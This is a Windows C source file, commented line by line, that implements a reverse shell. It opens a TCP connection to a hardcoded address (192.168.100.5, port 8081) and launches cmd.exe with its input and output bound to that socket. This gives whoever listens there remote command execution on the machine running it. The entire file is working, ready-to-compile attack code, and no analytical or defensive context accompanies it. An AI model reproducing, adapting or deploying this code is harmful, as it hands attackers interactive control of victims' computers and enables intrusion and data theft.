#include <WinSock2.h>   // Header file for Windows Sockets 2 API
#include <stdio.h>      // Standard I/O functions
#include <Windows.h>    // Windows API functions
#include <ws2tcpip.h>   // Header file for TCP/IP protocols
#pragma comment(lib , "Ws2_32.lib")  // Linker directive to include Ws2_32.lib library

int main()
{
    // Declare necessary variables
    SOCKET shell;                   // Socket descriptor
    sockaddr_in shell_addr;         // Structure to hold socket address information
    WSADATA wsa;                    // Structure to store Winsock data
    STARTUPINFO si;                 // Structure to specify startup information for a process
    PROCESS_INFORMATION pi;         // Structure to receive information about the newly created process
    char RecvServer[512];           // Buffer to store received data from server
    int connection;                 // Variable to store connection status
    char ip_addr[] = "192.168.100.5";  // IP address of the server
    int port = 8081;                // Port number to connect to

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("Failed to initialize Winsock.\n");
        return 1;
    }

    // Create a TCP socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    if (shell == INVALID_SOCKET) {
        printf("Failed to create socket.\n");
        WSACleanup();
        return 1;
    }

    // Fill in socket address information
    shell_addr.sin_port = htons(port);                // Set port
    shell_addr.sin_family = AF_INET;                   // Set address family
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);   // Set IP address

    // Connect to the target server
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR) {
        printf("Failed to connect to target server.\n");
        closesocket(shell);
        WSACleanup();
        return 1;
    }

    // Receive data from the server
    recv(shell, RecvServer, sizeof(RecvServer), 0);

    // Prepare startup information for the process
    memset(&si, 0, sizeof(si));    // Clear the structure
    si.cb = sizeof(si);             // Set the size of the structure
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);  // Set flags for standard handles and window visibility
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;   // Set standard input/output/error to the socket

    // Create a new process (cmd.exe) with redirected standard handles
    char command[] = "cmd.exe";  // Command to execute
    if (!CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("Failed to create process.\n");
        closesocket(shell);
        WSACleanup();
        return 1;
    }

    // Wait for the newly created process to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Clear the receive buffer
    memset(RecvServer, 0, sizeof(RecvServer));

    // Close the socket
    closesocket(shell);

    // Cleanup Winsock resources
    WSACleanup();

    return 0;
}
